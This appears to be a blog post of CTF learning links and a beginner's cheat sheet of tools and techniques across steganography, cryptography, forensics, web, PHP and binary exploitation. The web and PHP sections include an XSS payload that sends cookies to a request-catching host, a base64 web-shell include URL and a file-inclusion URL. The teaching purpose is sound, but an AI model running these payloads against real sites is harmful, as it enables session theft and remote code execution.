---
layout: post
title:  "ctf"
date:   2024-08-08 12:32:45 +0100
categories:
---

- [Videos](#videos)


# CTF
**[CTFTime](https://ctftime.org)**<br>
**[OverTheWire](https://overthewire.org/wargames)**<br>
**[PicoCTF](https://play.picoctf.org)**<br>
**[ImaginaryCTF](https://imaginaryctf.org)**<br>
**[247CTF](https://247ctf.com)**<br>
**[CTF Challenge](https://ctfchallenge.com)**<br>
**[CTF Learn](https://ctflearn.com)**<br>
**[CryptoHack](https://cryptohack.org)**<br>
**[HackThisSite](https://www.hackthissite.org)**<br>
**[SmashTheStack](http://smashthestack.org/wargames.html)**<br>
**[W3Challs](https://w3challs.com/challenges)**<br>
**[Ringzer0CTF](https://ringzer0ctf.com/challenges)**<br>
**[Enigma Group](https://www.enigmagroup.org)**<br>
**[Root Me](https://www.root-me.org)**

# Pentesting
**[HackTheBox](https://app.hackthebox.eu)**<br>
**[TryHackMe](https://tryhackme.com)**<br>
**[OffSec Proving Grounds](https://www.offensive-security.com/labs)**<br>
**[Web Security Academy](https://portswigger.net/web-security)**<br>
**[Damn Vulnerable Web Application](https://github.com/digininja/DVWA)**<br>
**[OWASP Juice Shop](https://github.com/juice-shop/juice-shop-ctf)**<br>
**[Hacker 101](https://ctf.hacker101.com)**<br>
**[PentesterLab](https://pentesterlab.com)**<br>
**[VulnHub](https://www.vulnhub.com)**<br>
**[VulnMachines](https://www.vulnmachines.com)**<br>
**[HackingLab](https://www.hacking-lab.com/index.html)**<br>
**[CyberSecLabs](https://www.cyberseclabs.co.uk)**<br>
**[HackXOR](https://hackxor.net)**<br>
**[Hacktoria](https://hacktoria.com)**

# Pwn / RE
**[Pwn.College](https://pwn.college)**<br>
**[ROP Emporium](https://ropemporium.com)**<br>
**[Exploit Education](https://exploit.education)**<br>
**[How2Heap](https://github.com/shellphish/how2heap)**<br>
**[Pwnables](https://pwnable.tw/challenge)**<br>
**[Deusx64](https://deusx64.ai)**<br>
**[Roppers Academy](https://roppers.org/collections)**<br>
**[Azeria Labs](https://azeria-labs.com/writing-arm-assembly-part-1)**<br>
**[Reversing Challenges](https://challenges.re)**<br>
**[Begin RE](https://www.begin.re)**<br>
**[CrackMes](https://crackmes.one)**

# Blue Team
**[LetsDefend](https://letsdefend.io)**<br>
**[Blue Team Labs Online](https://blueteamlabs.online)**<br>
**[Cyber Defenders](https://cyberdefenders.org)**<br>
**[Attack Defense](https://attackdefense.com)**<br>
**[Immersive Labs](https://dca.immersivelabs.online)**

# Videos
{:#videos}

**[LiveOverflow](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)**<br>
**[John Hammond](https://www.youtube.com/c/JohnHammond010)**<br>
**[IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)**<br>
**[XCT](https://www.youtube.com/channel/UClGm2C8Qi0_Wv68zfjCz2YA)**<br>
**[Gynvael](https://www.youtube.com/user/GynvaelEN)**<br>
**[ZetaTwo](https://www.youtube.com/c/ZetaTwo)**<br>
**[PwnFunction](https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A)**<br>
**[0xdf](https://www.youtube.com/channel/UChO9OAH57Flz35RRX__E25A)**<br>
**[247CTF](https://www.youtube.com/channel/UCtGLeKomT06x3xZ2SZp2l9Q)**<br>
**[MalFind](https://www.youtube.com/channel/UCJf4-reOhoiAlScWC1WzLgQ)**<br>
**[DayZeroSec](https://www.youtube.com/c/dayzerosec)**<br>
**[Rana Khalil](https://www.youtube.com/c/RanaKhalil101)**<br>
**[PinkDraconian](https://www.youtube.com/channel/UCmXwpkCXmIKjoRLMsq9I3RA)**<br>
**[Superhero1](https://www.youtube.com/channel/UCm2SwKmx3Ya1HG5RmHR7SCA)**<br>
**[S1lk](https://www.youtube.com/c/AlexChaveriat)**<br>
**[Alh4zr3d](https://www.youtube.com/channel/UCz-Z-d2VPQXHGkch0-_KovA)**<br>
**[Pawe≈Ç ≈Åukasik](https://www.youtube.com/c/PawelLukasik)**<br>
**[Ephemeral](https://www.youtube.com/c/BasteG0d69)**<br>
**[Hak5](https://www.youtube.com/c/hak5)**<br>
**[Conda](https://www.youtube.com/c/c0nd4)**<br>
**[HackerSploit](https://www.youtube.com/c/HackerSploit)**<br>
**[Condingo](https://www.youtube.com/c/codingo)**<br>
**[InsiderPhd](https://www.youtube.com/c/InsiderPhD)**<br>
**[HackSplained](https://www.youtube.com/c/Hacksplained)**<br>
**[TheCyberMentor](https://www.youtube.com/c/TheCyberMentor)**<br>
**[StackSmashing](https://www.youtube.com/c/stacksmashing)**<br>
**[Cybersecurity Meg](https://www.youtube.com/c/CybersecurityMeg)**<br>
**[Tib3rius](https://www.youtube.com/c/Tib3rius)**<br>
**[SecAura](https://www.youtube.com/channel/UCx89Lz24SEPZpExl6OfQ0Gg)**<br>
**[DarkSec](https://www.youtube.com/c/DarkSec)**<br>
**[Hexorcist](https://www.youtube.com/c/HEXORCIST)**<br>
**[PwnCollege](https://www.youtube.com/c/pwncollege)**<br>
**[NahamSec](https://www.youtube.com/c/Nahamsec)**<br>
**[Optional](https://www.youtube.com/c/optionalctf)**<br>
**[TheHackerish](https://www.youtube.com/c/thehackerish)**<br>
**[Ryan Gordon](https://www.youtube.com/c/0xRy4n)**<br>
**[AlmondForce](https://www.youtube.com/c/AlmondForce)**<br>
**[VulnMachines](https://www.youtube.com/c/vulnmachines)**<br>
**[Others](https://securitycreators.video)**

# Tools
**[Ghidra](https://ghidra.re/CheatSheet.html)**<br>
**[Volatility](https://github.com/volatilityfoundation/volatility/wiki/Linux)**<br>
**[PwnTools](https://github.com/Gallopsled/pwntools-tutorial)**<br>
**[CyberChef](https://gchq.github.io/CyberChef)**<br>
**[DCode](https://www.dcode.fr/en)**<br>
**[Decompile Code](https://www.decompiler.com)**<br>
**[Run Code](https://tio.run)**<br>
**[GTFOBins](https://gtfobins.github.io)**<br>
**[ExploitDB](https://www.exploit-db.com)**<br>
**[RevShells](https://revshells.com)**

# More Resources
**[Bug Bounty Platforms](https://github.com/disclose/bug-bounty-platforms)**<br>
**[HackTricks](https://book.hacktricks.xyz/pentesting-methodology)**<br>
**[CTF Resources](https://github.com/apsdehal/awesome-ctf)**<br>
**[Security Resources](https://github.com/CompassSecurity/security_resources)**<br>
**[Bug Bounty Resources](https://www.hacker101.com/resources)**<br>
**[Seal9055 Resources](https://github.com/seal9055/resources)**<br>
**[Forensics](https://cugu.github.io/awesome-forensics)**<br>
**[Learn RE](https://hshrzd.wordpress.com/how-to-start)**<br>
**[Learn BinExp](https://guyinatuxedo.github.io)**<br>
**[HTB Writeups](https://0xdf.gitlab.io)**

Welcome to the world of CTFs üè¥‚Äç‚ò†Ô∏è

--------------------------

This is an introduction to some of the basics of each category. It was designed to help beginners and old comrades, enjoy the ride and "Pwn Every CTF".


Esoteric Languages
-----------------------

* [https://tio.run/](https://tio.run/)

	An online tool that has a ton of Esoteric language interpreters. 

* Brainfuck

	This language is easily detectable by its huge use of plus signs, braces, and arrows. 	There are plenty of online interpreters, like this one: [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/) Some example code:

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.--.--------------.+++++++++++++.----.-----------
--.++++++++++++.--------.<------------.<++.>>----.+.<+++++++++++.+++++++++++++.>+++++++++++++++++.-------------
--.++++.+++++++++++++++.<<.>>-------.<+++++++++++++++.>+++..++++.--------.+++.<+++.<++++++++++++++++++++++++++
.<++++++++++++++++++++++.>++++++++++++++..>+.----.>------.+++++++.--------.<+++.>++++++++++++..-------.++.
```

* [Malboge]

	An esoteric language that looks a lot like Base85... but isn't. Often has references to "Inferno" or "Hell" or "Dante." Online interpreters like so: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) Example code:

```
(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
```

* [Piet]

	A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool [`npiet`][npiet]

![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)


* [Ook!](http://esolangs.org/wiki/ook!)

	A joke language. Recognizable by `.` and `?`, and `!`.
	
* Hexahue Cipher

![](https://miro.medium.com/max/465/1*QY8sg087QQwXOoS3Cu1cWg.jpeg)


https://www.dcode.fr/hexahue-cipher
```
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
```

Steganography
---------------------

* [StegCracker][StegCracker]

	Don't ever forget about [`steghide`][steghide]! This tool can use a password list like `rockyou.txt` with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.

* [`steg_brute.py`](https://github.com/Va5c0/Steghide-Brute-Force-Tool)

	This is similar to `stegcracker` above.

* [`openstego`][OpenStego]

	A [Java][Java] [`.JAR`][JAR] tool, that can extract data from an image. A good tool to use on guessing challenges, when you don't have any other leads. We found this tool after the [Misc50](http://0xahmed.ninja/nullcon-hackim18-ctf-writeups/) challenge from [HackIM 2018](https://ctftime.org/event/566)

* [`Stegsolve.jar`][Stegsolve.jar]

	A [Java][Java] [`.JAR`][JAR] tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.

* [`steghide`][steghide]

	A command-line tool typically used alongside a password or key, that could be uncovered some other way when solving a challenge. 

* [`zsteg`][zsteg]

	Command-line tool for use against Least Significant Bit steganography... unfortunately only works against PNG and BMP images.

* [`jsteg`][jsteg]

    Another command-line tool to use against JPEG images. [https://github.com/lukechampine/jsteg](https://github.com/lukechampine/jsteg) Handy for Hackerrank Codefest CTF 2018.

* [Jstego][Jstego]

    A GUI tool for JPG steganography. [https://sourceforge.net/projects/jstego/](https://sourceforge.net/projects/jstego/) It is a [Java][Java] [JAR] file similar to stegsolve.jar

* Morse Code

	Always test for this if you are seeing two distinct values... _it may not always be binary!_ Online decoders like so: [https://morsecode.scphillips.com/translator.html](https://morsecode.scphillips.com/translator.html) 	

* Whitespace

	Tabs and spaces could be representing 1's and 0's and treating them as a binary message... or, they could be whitespace done with [`snow`][snow] or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)

* DNA Codes

    When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:

    ![img/dna_codes.png](img/dna_codes.png)
    ![img/genome_coding.jpg](img/genome-coding.jpg)

* [`snow`][snow]

	A command-line tool for whitespace steganography (see above).

* SONIC Visualizer (audio spectrum)

	Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you [spectrogram](https://en.wikipedia.org/wiki/Spectrogram). __If it sounds like there is random bleeps and bloops in the sound, try this tactic!__

* [Detect DTMF Tones]

	Audio frequencies common to a phone button, DTMF: [https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).

* Phone-Keypad

	Some messages may be hidden with a string of numbers, but really be encoded with old cell-phone keypads, like text messaging with numbers repeated:

![https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov)

* [`hipshot`][hipshot]

	A [Python] module to compress a video into a single standalone image, simulating a long-exposure photograph. Was used to steal a [QR code] visible in a video, displayed through "Star Wars" style text motion.	

* [QR code]

	A small square "barcode" image that holds data.

* [`zbarimg`][zbarimg]

	A command-line tool to quickly scan multiple forms of barcodes, [QR codes] included. Installed like so on a typical [Ubuntu] image: 

```
sudo apt install zbar-tools
```
	
* Punctuation marks `!`, `.` and `?`

	I have seen some challenges use just the end of `.` or `?` or `!` to represent the [Ook](http://esolangs.org/wiki/ook!) esoteric programming language. Don't forget that is a thing!

Cryptography
-----------------


* Keyboard Shift
	
	[https://www.dcode.fr/keyboard-shift-cipher](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...

* Bit Shift

	Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x >> 1 ) or ( x << 1 ).

* Reversed Text

	Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in [Python] like so:

```
"UOYMORFEDIHOTGNIYRTEBTHGIMFTCATAHTTERCESASISIHT"[::-1]
```

* XOR

	ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in `\xde\xad\xbe\xef` etc..) Note that you can do easy XOR locally with Python like so (you need `pwntools` installed):

	``` python
	python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")
	```


* Caesar Cipher

	The most classic shift cipher. Tons of online tools like this: [https://www.dcode.fr/caesar-cipher](https://www.dcode.fr/caesar-cipher) or use `caesar` as a command-line tool (`sudo apt install bsdgames`) and you can supply a key for it. Here's a one liner to try all letter positions:

	```
	cipher='jeoi{geiwev_gmtliv_ws_svmkmrep}' ; for i in {0..25}; do echo $cipher | caesar $i; done
	```

	__Be aware!__ Some challenges include punctuation in their shift! If this is the case, try to a shift within all 255 ASCII characters, not just 26 alphabetical letters!

* `caesar`

	A command-line caesar cipher tool (noted above) found in the `bsdgames` package.

* [Atbash Cipher]

	If you have some text that you have no idea what it is, try the [Atbash cipher]! It's a letter mapping, but the alphabet is reversed: like `A` maps to `Z`, `B` maps to `Y` and so on. There are tons of online tools to do this ([http://rumkin.com/tools/cipher/atbash.php](http://rumkin.com/tools/cipher/atbash.php)), and you can build it with [Python].

* [Vigenere Cipher]

	[http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx), [https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) and personal Python code here: [https://pastebin.com/2Vr29g6J](https://pastebin.com/2Vr29g6J)

* Beaufourt Cipher

	[https://www.dcode.fr/beaufort-cipher](https://www.dcode.fr/beaufort-cipher)


* Python random module cracker/predictor

	[https://github.com/tna0y/Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)... helps attack the Mersenne Twister used in Python's random module. 

* Transposition Cipher

* RSA: Classic RSA

	Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)

* RSA: Multi-prime RSA

* RSA: `e` is 3 (or small)

	If `e` is 3, you can try the cubed-root attack. If you the cubed root of `c`, and if that is smaller than the cubed root of `n`, then your plaintext message `m` is just the cubed root of `c`! Here is [Python] code to take the cubed root:

```
def root3rd(x):
    y, y1 = None, 2
    while y!=y1:
        y = y1
        y3 = y**3
        d = (2*y3+x)
        y1 = (y*(y3+2*x)+d//2)//d
    return y 
``` 

* RSA: Weiner's Little D Attack

	The telltale sign for this kind of challenge is an enormously large `e` value. Typically `e` is either 65537 (0x10001) or `3` (like for a Chinese Remainder Theorem challenge). Some stolen code available here: [https://pastebin.com/VKjYsDqD](https://pastebin.com/VKjYsDqD)

* RSA: Chinese Remainder Attack

	These challenges can be spotted when given  mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)

* [LC4]

	This is an adaptation of RC4... just not. There is an implementation available in Python.
	[https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)

* Elgamal

* Affine Cipher

* Substitution Cipher (use quip quip!)

	[https://quipqiup.com/](https://quipqiup.com/)

* Railfence Cipher

	[http://rumkin.com/tools/cipher/railfence.php](http://rumkin.com/tools/cipher/railfence.php)


* [Playfair Cipher]

	racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)

* Polybius Square

	[https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)

* The Engima

	[http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html),
	[https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)

* AES ECB

	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length. 


* Two-Time Pad

	

Networking
---------------

* [Wireshark]

	The go-to tool for examining [`.pcap`][PCAP] files. 

* [Network Miner]

	Seriously cool tool that will try and scrape out images, files, credentials and other goods from [PCAP] and [PCAPNG] files.

* [PCAPNG]

	Not all tools like the [PCAPNG] file format... so you can convert them with an online tool [http://pcapng.com/](http://pcapng.com/) or from the command-line with the `editcap` command that comes with installing [Wireshark]:

```
editcap old_file.pcapng new_file.pcap
```

* [`tcpflow`][tcpflow]

	A command-line tool for reorganizing packets in a PCAP file and getting files out of them. __Typically it gives no output, but it creates the files in your current directory!__ 

```
tcpflow -r my_file.pcap
ls -1t | head -5 # see the last 5 recently modified files
```



* [PcapXray]

	A GUI tool to visualize network traffic.

PHP
------------

* Magic Hashes

	A common vulnerability in [PHP] that fakes hash "collisions..." where the `==` operator falls short in [PHP] type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes), but below are the most common breaks.

| Plaintext | MD5 Hash |
| --------- | -------- |
|240610708|0e462097431906509019562988736854|
|QLTHNDT|0e405967825401955372549139051580|
|QNKCDZO|0e830400451993494058024219903391|
|PJNPDWY|0e291529052894702774557631701704|
|NWWKITQ|0e763082070976038347657360817689|
|NOOPCJF|0e818888003657176127862245791911|
|MMHUWUV|0e701732711630150438129209816536|
|MAUXXQC|0e478478466848439040434801845361|
|IHKFRNS|0e256160682445802696926137988570|
|GZECLQZ|0e537612333747236407713628225676|
|GGHMVOE|0e362766013028313274586933780773|
|GEGHBXL|0e248776895502908863709684713578|
|EEIZDOI|0e782601363539291779881938479162|
|DYAXWCA|0e424759758842488633464374063001|
|DQWRASX|0e742373665639232907775599582643|
|BRTKUJZ|00e57640477961333848717747276704|
|ABJIHVY|0e755264355178451322893275696586|
|aaaXXAYW|0e540853622400160407992788832284|
|aabg7XSs|0e087386482136013740957780965295|
|aabC9RqS|0e041022518165728065344349536299|

| Plaintext | SHA1 Hash |
| --------- | --------- |
|aaroZmOk|0e66507019969427134894567494305185566735|
|aaK1STfY|0e76658526655756207688271159624026011393|
|aaO8zKZF|0e89257456677279068558073954252716165668|
|aa3OFF9m|0e36977786278517984959260394024281014729|


* `preg_replace`

	A bug in older versions of [PHP] where the user could get remote code execution
	
	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)


* [`phpdc.phpr`][phpdc.phpr]

	A command-line tool to decode [`bcompiler`][bcompiler] compiled [PHP] code.


* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

	A bug in [PHP] where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:

```
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
```


* `data://text/plain;base64`

	A [PHP] stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868) ... TL;DR:

```
http://103.5.112.91:1234/?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
``` 


PDF Files
-------------

* `pdfinfo`	
	
	A command-line tool to get a basic synopsis of what the [PDF] file is.

* `pdfcrack`

	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.

* `pdfimages`

	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.

* [`pdfdetach`][pdfdetach]

	A command-line tool to extract files out of a [PDF].


Forensics
-----------


* [Magic Numbers]

	The starting values that identify a file format. These are often crucial for programs to properly read a certain file type, so they must be correct. If some files are acting strangely, try verifying their [magic number] with a [trusted list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

* [`hexed.it`][hexed.it]

	An online tool that allows you to modify the hexadecimal and binary values of an uploaded file. This is a good tool for correcting files with a corrupt [magic number]

* [`dumpzilla`][dumpzilla]

	A [Python] script to examine a `.mozilla` configuration file, to examine downloads, bookmarks, history or bookmarks and registered passwords. Usage may be as such:

```
python dumpzilla.py .mozilla/firefox/c3a958fk.default/ --Downloads --History --Bookmarks --Passwords
```


* Repair image online tool

    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)


* `foremost`

	A command-line tool to carve files out of another file. Usage is `foremost [filename]` and it will create an `output` directory.

```
sudo apt install foremost
```

* `binwalk`

	A command-line tool to carve files out of another file. Usage to extract is `binwalk -e [filename]` and it will create a `_[filename]_extracted` directory.

```
	sudo apt install binwalk
```


* [`hachoir-subfile`][hachoir-subfile]

	A command-line tool to carve out files of another file. Very similar to the other tools like `binwalk` and `foremost`, but always try everything!


* [TestDisk]

	A command-line tool, used to recover deleted files from a file system image. Handy to use if given a `.dd` and `.img` file etc.


PNG File Forensics
--------------------


* `pngcheck`

	A command-line tool for "checking" a [PNG] image file. Especially good for verifying checksums.


APK Forensics
---------------

* [`apktool`][apktool]

	A command-line tool to extract all the resources from an APK file. Usage:

```
apktool d <file.apk>
```


* [`dex2jar`][dex2jar]

	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.


* [`jd-gui`][jd-gui]

	A GUI tool to decompile Java code, and JAR files.
	

Web
----------------

* `robots.txt`

	This file tries to hide webpages from web crawlers, like Google or Bing or Yahoo. A lot of sites try and use this mask sensitive files or folders, so it should always be some where you check during a CTF. [http://www.robotstxt.org/](http://www.robotstxt.org/)

* [Edit This Cookie]

	A web browser plug-in that offers an easy interface to modifying [cookies]. ___THIS IS OFTEN OVERLOOKED, WITHOUT CHANGING THE VALUE OF THE COOKIES... BE SURE TO FUZZ EVERYTHING, INCLUDING COOKIE VALUES!___

* Backup pages ( `~` and `.bak` and `.swp` )

	Some times you may be able to dig up an old version of a webpage (or some PHP source code!) by adding the usual backup suffixes. A good thing to check!

* `/admin/`

	This directory is often found by directory scanning bruteforce tools, so I recommend just checking the directory on your own, as part of your own "low-hanging fruits" check.

* `/.git/`
	
	A classic CTF challenge is to leave a `git` repository live and available on a website. You can see this with `nmap -A` (or whatever specific script catches it) and just by trying to view that specific folder, `/.git/`. A good command-line tool for this is [`GitDumper.sh`](https://github.com/internetwache/GitTools), or just simply using [`wget`][wget].

* [`GitDumper.sh`][GitDumper.sh]
	
	A command-line tool that will automatically scrape and download a [git] repository hosted online with a given URL.

* [XSS]/[Cross-site scripting]

	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML] and ideally inject [JavaScript] code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:

```
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.

```
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```

* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)

	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.
	
``` python
#!/usr/bin/env python

import cfscrape

url = 'http://yashit.tech/tryharder/'

scraper = cfscrape.create_scraper() 
print scraper.get(url).content 
```

* [XSStrike]

	A command-line tool for automated [XSS] attacks. Seems to function like how [sqlmap] does.

* [`wpscan`][wpscan]

	* A Ruby script to scan and do reconnaissance on a [Wordpress] application. 
	
* Cookie Catcher

* [`requestb.in`](https://requestb.in/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS] vulnerabilty.

* [`hookbin.com`](https://hookbin.com/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS] vulnerabilty.

* [`sqlmap`][sqlmap]

	A command-line tool written in [Python] to automatically detect and exploit vulnerable SQL injection points.	

* Flask Template Injection

	[https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html), [https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html](https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html), [https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html](https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)


* SQL `IF` statements

	These are handy for some injections and setting up some Blind SQL if you need to. Syntax is like `SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )`

* Explicit SQL Injection

	

* Blind SQL Injection

	


* gobuster
	
	

* DirBuster

* `nikto`


* Burpsuite
	


Reverse Engineering
-------------------

* `ltrace` and `strace`

	Easy command-line tools to see some of the code being executed as you follow through a binary. Usage: `ltrace ./binary`

* Hopper

* Binary Ninja

* gdb

* IDA




PowerShell
-------------

* [nishang]

	A PowerShell suite of tools for pentesting. Has support for an ICMP reverse shell!

* [Empire]

	HUGE PowerShell library and tool to do a lot of post-exploitation.

* [Bypass AMSI Anti-Malware Scan Interface](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html?mkt_tok=eyJpIjoiWTJGaU5qbGlaVFZsTXpVdyIsInQiOiJBSXdzQm5FMGY0S1BrTWlBcVBlZ3ErN2NcL1RNeGkwcnNSK3FZcGVvaUhFRVJiQUhVcmVIWko0aWdNNCtXcVRrcWtDRTMxRGlpM1wvQlIxVHZlU1RUNk5sRVJnQ1dUZEFVQ0JTRHk4ejNVQTBWK1Y3Um1EWHZYdGY5YWQ5V2hTZFVXIn0%3D)

	Great tool and guide for anti-virus evasion with PowerShell.


Windows Executables
-------------

* [`pefile`][pefile]

	A [Python] module that examines the headers in a Windows [PE (Portable Executable)][PE] file. 

* [dnSpy]

	A [Windows] GUI tool to decompile and reverse engineer [.NET] binaries

* [PEiD][PEiD]

	A [Windows] tool to detect common packers, cryptors and compilers for [Windows][Windows] [PE][PE] 

* jetBrains .NET decompiler

* AutoIT converter

	When debugging AutoIT programs, you may get a notification: "This is a compiled AutoIT script". Here is a good thing to use to decode them: [https://www.autoitscript.com/site/autoit/downloads/](https://www.autoitscript.com/site/autoit/downloads/)
	
Python Reversing
------------

* [Easy Python Decompiler]

	A small `.exe` GUI application that will "decompile" [Python] bytecode, often seen in `.pyc` extension. The tool runs reliably on [Linux] with [Wine].



Binary Exploitation/pwn
--------------

* Basic Stack Overflow

	Use `readelf -s <binary>` to get the location of a function to jump to -- overflow in Python, find offset with `dmesg`, and jump.	

* `printf` vulnerability

	A C binary vulnerability, where `printf` is used with user-supplied input without any arguments. Hand-made code to exploit and overwrite functions: [https://pastebin.com/0r4WGn3D](https://pastebin.com/0r4WGn3D) and a video walkthrough explaining: [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)

* [`formatStringExploiter`][formatStringExploiter]

	A good [Python] module to streamline exploiting a [format string vulnerability]. THIS IS NOT ALWAYS A GOOD TACTIC...

* 64-bit Buffer Overflow

	64-bit buffer overflow challenges are often difficult because the null bytes get in the way of memory addresses (for the function you want to jump to, that you can usually find with `readelf -s`). But, check if whether or not the function address you need starts with the same hex values already on the stack (in `rsp`). Maybe you only have to write two or three bytes after the overflow, rather than the whole function address. 


VisualBasicScript Reversing
---------------------------


Miscellaneous
----------



* [Base64], [Base32], [Base85]

```
Base64:
TWFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5vdCBvbmx5IGJ5IGhpcyByZWFzb24sIGJ1dCBieSB0aGlz
IHNpbmd1bGFyIHBhc3Npb24gZnJvbSBvdGhlciBhbmltYWxzLCB3aGljaCBpcyBhIGx1c3Qgb2Yg
dGhlIG1pbmQsIHRoYXQgYnkgYSBwZXJzZXZlcmFuY2Ugb2YgZGVsaWdodCBpbiB0aGUgY29udGlu
dWVkIGFuZCBpbmRlZmF0aWdhYmxlIGdlbmVyYXRpb24gb2Yga25vd2xlZGdlLCBleGNlZWRzIHRo
ZSBzaG9ydCB2ZWhlbWVuY2Ugb2YgYW55IGNhcm5hbCBwbGVhc3VyZS4=
```

```
Base32
